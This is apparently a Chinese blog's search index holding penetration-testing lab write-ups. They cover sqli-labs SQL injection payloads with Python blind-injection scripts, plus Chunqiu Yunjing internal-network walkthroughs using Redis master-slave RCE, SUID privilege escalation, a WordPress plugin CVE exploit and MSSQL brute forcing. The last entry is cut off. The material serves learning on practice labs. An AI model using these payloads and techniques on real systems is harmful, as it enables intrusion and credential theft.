<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs-master</title>
      <link href="/2025/12/22/sqli-labs-master/"/>
      <url>/2025/12/22/sqli-labs-master/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>就是一个post注入测出闭合方式为单引号，没有过滤</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测出闭合方式为”)，没有任何过滤</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测出闭合方式之后无回显优先尝试报错注入updatexml，依旧没有过滤</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>闭合方式变了，报错注入依然可以</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>一开始测闭合没测出来，因为不管我用什么都没发现报错，索性就是直接sqlmap去试一下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-15/ --forms</span><br></pre></td></tr></table></figure><p>sqlmap确实跑出来了，闭合方式是单引号，但是没有语法报错的回显</p><p><img src="/../images/achieve/2025/12/image-20251222220207921.png" alt="image-20251222220207921"></p><p>这就意味着它对语法错误的一个隐藏，这是你就是不能单独的去fuzz它的单引号了，利用布尔盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span></span><br><span class="line">success_mark = <span class="string">&quot;flag.jpg&quot;</span>  <span class="comment"># 登录成功时页面包含的关键词</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">                <span class="keyword">if</span> success_mark <span class="keyword">in</span> response.text:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt;= <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 正在猜解第 <span class="subst">&#123;i&#125;</span> 位: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 最终结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    inject()</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>闭合方式变成了”)，依旧是无回显，报错注入不行，那么就是布尔盲注</p><h2 id="Less-17-update注入"><a href="#Less-17-update注入" class="headerlink" title="Less-17(update注入)"></a>Less-17(update注入)</h2><p>开始在uname测试啥也没测出来，然后就看源码去了！这里就是我小丑了，更新密码这玩意就应该想到update，看了源码uname有过滤，先不考虑</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>update=&quot;UPDATE users SET password = &#x27;<span class="built_in">$</span>passwd&#x27; WHERE username=&#x27;<span class="built_in">$</span>row1&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这里的passwd没有过滤直接打</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd=1111&#x27; and updatexml(2,concat(0x7e,(select password from users)),0)<span class="params">#</span><span class="built_in">&amp;</span>submit=Submit<span class="built_in">&amp;</span>uname=admin</span><br><span class="line"></span><br><span class="line">You can&#x27;t specify target table &#x27;users&#x27; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这里就是表冲突了，就是你update的表和你select查询的表重复了，用一下嵌套</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1111&#x27; and updatexml(2,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from (select password from users) as temp)),0)<span class="params">#</span><span class="built_in">&amp;</span>submit=Submit<span class="built_in">&amp;</span>uname=admin</span><br></pre></td></tr></table></figure><p><strong>关键是：黑盒想到update，还有就是嵌套去避免冲突</strong></p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>黑盒打不出，还是去看源码打的，在UA头可以注入，注意得先登录进去</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:11111&#x27; and updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from users)),1), 123, &#x27;rufeii&#x27;)<span class="params">#</span></span><br></pre></td></tr></table></figure><p>然后在别人那学到</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>这个相当于就不用去考虑插入了几条数据</p><p>白盒打出来了，想想黑盒的思路（有点事后诸葛亮了）</p><p><img src="/../images/achieve/2025/12/image-20251223211536324.png" alt="image-20251223211536324"></p><p>没有任何操作就是来了ip，那么这里就是没有进行数据库查询之前就是获取了ip，然后试了一下没有xff注入。应该是要登录进去，不登录的话………</p><p>你不管是xff和UA头进行注入，它无非就是两种场景：1，限制访问 2，记录日志</p><p>这里的话就是考虑记录，那你记录的话一般是跟用户一起记录的对吧，所以肯定要先登录，登录之后测出注入点就是去猜后端语句了</p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>Referer注入</p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>cookie注入</p><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>cookie变成了base64加密</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>同 21 ，单引号换成双引号即可</p><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>注释符没了，闭合就好</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(password) from users)),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>首先注册用户登录进去，有个修改密码的操作，符合二次注入的测试条件，但是注册用户那里限制了字长只能20个，这就不好办了，但是可以改其它用户的密码</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册用户&#x27;or&#x27;1&#x27;=&#x27;1&#x27;<span class="params">#</span></span><br></pre></td></tr></table></figure><p>改密码就全部改了</p><p><img src="/../images/achieve/2025/12/image-20251226171429344.png" alt="image-20251226171429344"></p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>过滤or和and，其实不然其实是置空这两个玩意，所以直接双写绕过即可</p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>字符型注入，其它与上题差不多</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,2,4<span class="comment">%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-26-无空格和注释符"><a href="#Less-26-无空格和注释符" class="headerlink" title="Less-26(无空格和注释符)"></a>Less-26(无空格和注释符)</h2><p>题目不能用空格了，空格的替代品也没有了，那么能不能不用空格呢？那就用逻辑符||和&amp;&amp;，这里我采用报错注入，注释也不能用，那就闭合</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表：1&#x27;||updatexml(1,concat(0x7e,(select(group<span class="built_in">_</span>concat(table<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.tables)where(table<span class="built_in">_</span>schema=database()))),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">字段：?id=1&#x27;||updatexml(1,concat(0x7e,(select(group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.columns)where(table<span class="built_in">_</span>schema=database()<span class="comment">%26%26table_name=&#x27;users&#x27;))),1)||&#x27;1&#x27;=&#x27;1</span></span><br></pre></td></tr></table></figure><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>报错没有了，搞了半天，直接布尔盲注，一开始&amp;&amp;在脚本里没编码，最终逐步排错到，一般都是二分法</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-26a/&quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 126</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:                          <span class="params">#</span>由于确定flag一定在可见字符的范围内，所以等左右指针重合时，那就是我们需要的字符了</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1                <span class="params">#</span>等价于(head+tail)//2整数除法</span><br><span class="line">        payload = f&quot;?id=0&#x27;||if(ascii(substr((select(group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name))from(infoorrmation<span class="built_in">_</span>schema.columns)where(table<span class="built_in">_</span>schema=database()<span class="comment">%26%26table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&#x27;1&#x27;=&#x27;2&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        if &quot;Your Password:999&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    if head != 32:                                    <span class="params">#</span>用于判断是否找完了flag</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br><span class="line"><span class="params">#</span>二分法脚本</span><br></pre></td></tr></table></figure><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>过滤的不全，注释没有了用%00截断</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=00000&#x27;<span class="comment">%0aUniOn%0aSeLect%0a1,2,(selECt%0agroup_concat(username,%27:%27,password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>“闭合</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=999999&quot;<span class="comment">%0aUnioN%0aSelecT%0a1,2,(selECt%0agroup_concat(username,%27:%27,password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>当你发现注入语句没什么问题的时候，可以考虑一下闭合方式的问题</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;(1&#x27;||&#x27;1&#x27;=&#x27;1)&#x27;如果闭合方式是&#x27;()&#x27;，你用1&#x27;||&#x27;1&#x27;=&#x27;1也是可以的</span><br><span class="line">?id=1&#x27;)<span class="comment">%0aorder%0aby%0a3;%00</span></span><br><span class="line">后面也是没什么难度</span><br></pre></td></tr></table></figure><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[<span class="keyword">\/</span><span class="keyword">\*</span>]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//strip out /*</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[--]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//Strip out --.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[<span class="params">#</span>]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);//Strip out <span class="params">#</span>.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[ +]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/select/m&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br><span class="line">//<span class="built_in">$</span>id= preg<span class="built_in">_</span>replace(&#x27;/[ +]/&#x27;,&quot;&quot;, <span class="built_in">$</span>id);    //Strip out spaces.</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=000&#x27;)<span class="comment">%0auniounion selectn select%0a1,2,(select%0agroup_concat(password)%0afrom%0ausers);%00</span></span><br></pre></td></tr></table></figure><p><code>preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);</code>这玩意也可以双写过，置空就双写就完事了XD</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Brute4Road</title>
      <link href="/2025/12/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBrute4Road/"/>
      <url>/2025/12/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CBrute4Road/</url>
      
        <content type="html"><![CDATA[<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>看了一下tp的图标扫了一下没发现nday，那么用fscan扫描一下</p><p><img src="/../images/achieve/2025/12/image-20251220202622563.png" alt="image-20251220202622563"></p><p>存在redis未授权访问，参考<a href="https://www.freebuf.com/articles/web/452309.html">Redis未授权访问详解——新手友好 - FreeBuf网络安全行业门户</a></p><p>写文件都用不了没有权限我都试了，再参考<a href="https://baozongwi.xyz/p/redis-unauthorized-access-exploit/">Redis未授权利用</a></p><p>只要未授权访问+未禁用<code>SLAVEOF</code>就可以打主从复制RCE</p><p>在 Redis 提示符下输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLAVEOF</span><br></pre></td></tr></table></figure><ul><li><strong>被禁用的表现</strong>：返回 <code>(error) ERR unknown command &#39;SLAVEOF&#39;</code> 或 <code>(error) ERR unknown command &#39;replicaof&#39;</code>。这说明管理员在 <code>redis.conf</code> 中使用了 <code>rename-command</code> 将其重命名或删除了。</li><li><strong>未禁用的表现</strong>：返回 <code>(error) ERR wrong number of arguments for &#39;slaveof&#39; command</code>。这说明命令存在，只是你没给参数。</li></ul><p><img src="/../images/achieve/2025/12/image-20251220202943380.png" alt="image-20251220202943380"></p><p>所以是可以打主从复制RCE</p><p>一键利用的工具 <a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><img src="/../images/achieve/2025/12/image-20251220205005436.png" alt="image-20251220205005436"></p><p>环境容易打崩一崩就要重开环境，所以争取一次性打通，反弹shell默认的是sh</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>利用这个命令起一个bash，ctrl+c直接又给我退出shell了，算了明天再打，没权限suid提权</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>base64提权，拿下第一个flag</p><p><img src="/../images/achieve/2025/12/image-20251221133553861.png" alt="image-20251221133553861"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>wget自己vps上的fscan还有linux_x64_agent，ipconfig用不了，可以用hostname -I</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] NetBios 172.22.2.34     XIAORANG<span class="keyword">\CLIENT</span>01             </span><br><span class="line">[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] OsInfo 172.22.2.3(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.2.16(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.18     WORKGROUP<span class="keyword">\UBUNTU</span>-WEB02        </span><br><span class="line">[+] ftp 172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点</span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">(icmp) Target 172.22.2.18    又一个WordPress站点</span><br><span class="line">(icmp) Target 172.22.2.3      DC</span><br><span class="line">(icmp) Target 172.22.2.7      已经拿下</span><br><span class="line">(icmp) Target 172.22.2.16    MSSQLSERVER</span><br></pre></td></tr></table></figure><p>总的来说就是没有扫出nday，但是有个wp的站点，用wpscan去扫描一下</p><p><img src="/../images/achieve/2025/12/image-20251221143015915.png" alt="image-20251221143015915"></p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><p>插件存在nday，工具一把锁<a href="https://github.com/biulove0x/CVE-2021-25003">biulove0x&#x2F;CVE-2021-25003: WPCargo &lt; 6.9.0 - Unauthenticated RCE</a></p><p>然后蚁剑连接&#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php存在数据库信息泄露，继续连接数据库</p><p><img src="/../images/achieve/2025/12/image-20251221143200759.png" alt="image-20251221143200759"></p><p>拿到第二个flag</p><p><img src="/../images/achieve/2025/12/image-20251221143432376.png" alt="image-20251221143432376"></p><p>有一堆密码，拿来横向试一试，唯一能想到的可能就是<code>172.22.2.16 MSSQLSERVER</code>这个的爆破了<a href="https://github.com/shack2/SNETCracker/releases">https://github.com/shack2/SNETCracker/releases</a></p><p>然后用MDUT连接一下啊，甜土豆提权，拿到第三个flag</p><p><img src="/../images/achieve/2025/12/image-20251221145122081.png" alt="image-20251221145122081"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Tsclient</title>
      <link href="/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"/>
      <url>/2025/12/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/</url>
      
        <content type="html"><![CDATA[<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>fscan漏扫一下</p><p><img src="/../images/achieve/2025/12/image-20251216231654859.png" alt="image-20251216231654859"></p><p>MDUT数据库连接工具连接一下，没权限，上传一个甜土豆提权</p><p><img src="/../images/achieve/2025/12/image-20251217102350753.png" alt="image-20251217102350753"></p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><p>提示用户会话，先上线cs</p><figure class="highlight shell"><figcaption><span>query user || qwinsta``查看当前在线用户</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251216233252828](../images/achieve/2025/12/image-20251216233252828.png)</span><br><span class="line"></span><br><span class="line">尝试进程注入，成功获取，``net use``查看共享</span><br><span class="line"></span><br><span class="line">![image-20251216233823396](../images/achieve/2025/12/image-20251216233823396.png)</span><br><span class="line"></span><br><span class="line">下面有个凭证</span><br><span class="line"></span><br><span class="line">![image-20251216233901612](../images/achieve/2025/12/image-20251216233901612.png)</span><br><span class="line"></span><br><span class="line">开始收集内网信息，上传fscan</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line"></span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span 